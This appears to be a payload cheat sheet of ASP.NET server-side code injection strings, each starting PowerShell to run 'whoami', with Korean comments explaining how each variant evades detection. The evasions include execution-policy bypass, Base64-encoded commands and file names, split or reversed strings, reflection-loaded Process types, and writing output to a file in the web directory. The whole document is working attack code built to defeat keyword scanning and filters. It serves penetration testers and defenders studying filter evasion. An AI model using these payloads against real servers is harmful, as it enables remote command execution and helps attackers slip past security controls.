<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -Command whoami") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
' -NoProfile 및 ExecutionPolicy Bypass 옵션을 부여하여 세션 제약 없이 whoami 실행
​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-e dwBoAGEAbQBpAA==") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
' whoami 명령어를 UTF-16LE Base64로 인코딩하여 인자(Argument) 키워드 스캔 우회
​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("cG93ZXJzaGVsbC5leGU=")), "-e dwBoAGEAbQBpAA==") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
' powershell.exe 파일명 및 명령어 전체를 Base64로 숨겨서 실행
​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("p"+"o"+"w"+"e"+"r"+"s"+"h"+"e"+"l"+"."+"e"+"x"+"e", "-c " + "&('w'+'h'+'o'+'a'+'m'+'i')") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
' PowerShell 문자열과 whoami 명령어를 쪼개서 결합(Concatenation) 후 호출
​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-c a='imaohw'; &(-joina[5..0])") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
' PowerShell 내부에서 문자열을 역순(Reverse) 배치 후 동적 복원하여 실행
​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-c [System.Security.Principal.WindowsIdentity]::GetCurrent().Name") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd() %>
' whoami.exe 프로세스를 띄우지 않고 PowerShell 내부에서 .NET API로 계정명 직접 추출
​<%= System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("powershell.exe", "-c whoami > " + Server.MapPath("p.txt")) { UseShellExecute = false }) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("p.txt")) %>
' C# 표준 출력 파이프를 거치지 않고 웹 디렉터리 임시 파일(p.txt)에 저장 후 System.IO로 확인
​<%= ((System.IO.StreamReader)Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetProperty("StandardOutput").GetValue(Type.GetType("System.Diag"+"nostics.Pro"+"cess, Sys"+"tem").GetMethod("Start", new Type[] { Type.GetType("System.Diag"+"nostics.Pro"+"cessStartInfo, Sys"+"tem") }).Invoke(null, new object[] { Activator.CreateInstance(Type.GetType("System.Diag"+"nostics.Pro"+"cessStartInfo, Sys"+"tem"), "powershell.exe", "-e dwBoAGEAbQBpAA==") }), null)).ReadToEnd() %>
' Process 및 ProcessStartInfo 타입을 문자열 동적 로드(Reflection)하여 PowerShell 실행